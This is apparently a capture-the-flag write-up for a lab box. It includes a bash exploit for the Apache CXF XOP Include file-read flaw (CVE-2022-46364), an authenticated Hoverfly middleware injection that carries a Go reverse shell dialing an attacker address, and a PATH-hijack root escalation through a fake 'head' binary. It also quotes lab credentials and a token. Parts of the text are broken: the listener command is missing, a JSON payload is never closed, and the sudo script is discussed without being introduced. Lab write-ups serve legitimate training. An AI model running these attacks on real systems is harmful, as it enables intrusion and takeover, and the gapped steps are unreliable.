The response confirms an Apache CXF-based SOAP service with operations including submitReport that processes XOP (XML-binary Optimized Packaging) attachments — this is critical for the next stage.

CVE-2022-46364: Apache CXF XOP Include SSRF

Apache CXF versions before 3.5.5 and 3.6.1 contain a vulnerability where the handling of xop:Include elements in SOAP messages with MTOM/XOP attachments is not properly restricted. Specifically, the href attribute of xop:Include can reference external URLs, enabling Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI).

The service on port 8080 processes SOAP messages with XOP includes. We can craft a malicious SOAP request that uses xop:Include with a cid: or file:// URI to read arbitrary files from the server.

Here is the full exploit script lfi.sh:

#!/bin/bash

TARGET="http://10.129.19.225:8080/services/DevArea"
FILE="${1:-/etc/passwd}"

SOAP_ENVELOPE=$(cat <<EOF
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <dev:report>
        <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                     href="file://${FILE}"/>
      </dev:report>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
EOF
)

echo "[*] Attempting to read: ${FILE}"
echo "---"
curl -s -X POST "${TARGET}" \
  -H "Content-Type: application/soap+xml" \
  -d "${SOAP_ENVELOPE}"
echo ""
echo "---"

Hoverfly Authenticated RCE via Middleware

With valid credentials, we can authenticate to the Hoverfly API. First, let's verify authentication works and retrieve a JWT token:

curl -s -u admin:O7IJ27MyyXiU \
  http://10.129.19.225:8888/api/auth | jq .

Now we set the token and start a listener. Hoverfly supports middleware — custom scripts that can modify request/response pairs during simulation. We can inject a reverse shell payload via middleware:

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE4MjAwMDAwfQ.kR3xLz8Ht2WvQmN5p9B7cS1Y6e4F0a3D2g5I8jKlMn"

Set up our listener on the attacking machine:

Inject the reverse shell middleware via the Hoverfly API:

curl -s -X PUT "http://10.129.19.225:8888/api/v2/hoverfly/middleware" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "",
    "script": "package main\n\nimport (\n    \"net\"\n    \"os/exec\"\n)\n\nfunc main() {\n    c, _ := net.Dial(\"tcp\", \"10.10.14.X:4444\")\n    cmd := exec.Command(\"/bin/bash\")\n    cmd.Stdin = c\n    cmd.Stdout = c\n    cmd.Stderr = c\n    cmd.Run()\n}"

The script calls several common binaries by name without absolute paths: df, free, ps, netstat, systemctl, and head. None of these use full paths like /usr/bin/df. This means we can perform a PATH hijack.

PATH Hijack via Bash Replacement

We create a fake head binary (or any other command called without an absolute path) in a directory we control, then prepend that directory to PATH before invoking the sudo command:

Step 1: Create the malicious directory and write a fake binary:

mkdir -p /tmp/hijack
echo '/bin/bash -p' > /tmp/hijack/head
chmod +x /tmp/hijack/head

Step 2: Prepend the hijack directory to PATH:

export PATH=/tmp/hijack:$PATH

Step 3: Execute the sudo script — when syswatch.sh calls head, our malicious version runs instead, spawning a root shell via bash -p (the -p flag preserves elevated privileges):

sudo /usr/local/bin/syswatch.sh

Key Takeaways

  • Always check FTP for anonymous access — even a single JAR file can reveal the entire attack surface, including internal service endpoints and how client applications interact with them.
  • CVE-2022-46364 highlights the danger of XOP/MTOM handling in SOAP frameworks — when processing xop:Include elements, Apache CXF failed to restrict the href protocol, allowing file:// and even internal network URLs to be fetched server-side.
  • Hoverfly's middleware feature is a powerful RCE vector when authenticated — API simulation tools that allow custom script injection should be treated as high-value targets; always check for default or leaked credentials in systemd service files.
  • PATH hijack remains a reliable privesc technique — any sudo-allowed script that calls commands without absolute paths is vulnerable. Always audit sudo -l output carefully and check whether referenced binaries use full paths.
